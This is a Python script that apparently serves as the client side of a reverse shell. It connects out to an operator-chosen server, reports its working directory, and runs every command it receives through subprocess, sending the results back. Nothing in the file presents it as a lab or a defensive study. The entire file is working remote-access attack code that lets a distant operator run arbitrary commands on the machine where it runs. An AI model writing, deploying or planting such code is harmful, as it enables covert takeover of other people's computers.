import socket
import os
import subprocess
import sys

SERVER_HOST = "192.168.81.1"  # Replace with your server IP address
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, feel free to increase
SEPARATOR = "<sep>"

def start_client(server_host):
    # Create the socket object
    s = socket.socket()
    # Connect to the server
    s.connect((server_host, SERVER_PORT))
    # Get the current directory
    cwd = os.getcwd()
    s.send(cwd.encode())

    while True:
        # Receive the command from the server
        command = s.recv(BUFFER_SIZE).decode()
        splited_command = command.split()
        if command.lower() == "exit":
            # If the command is exit, just break out of the loop
            break
        if splited_command[0].lower() == "cd":
            # CD command, change directory
            try:
                os.chdir(' '.join(splited_command[1:]))
            except FileNotFoundError as e:
                # If there is an error, set it as the output
                output = str(e)
            else:
                # If the operation is successful, set an empty message
                output = ""
        else:
            # Execute the command and retrieve the results
            output = subprocess.getoutput(command)
        # Get the current working directory as output
        cwd = os.getcwd()
        # Send the results back to the server
        message = f"{output}{SEPARATOR}{cwd}"
        s.send(message.encode())
    # Close the client connection
    s.close()

if __name__ == '__main__':
    k=input("press close to exit")
    if len(sys.argv) < 2:
        print("Error: Server host argument is missing.")
        print("Usage: python script.py <server_host>")
        sys.exit(1)


    server_host = sys.argv[1]
    start_client(server_host)
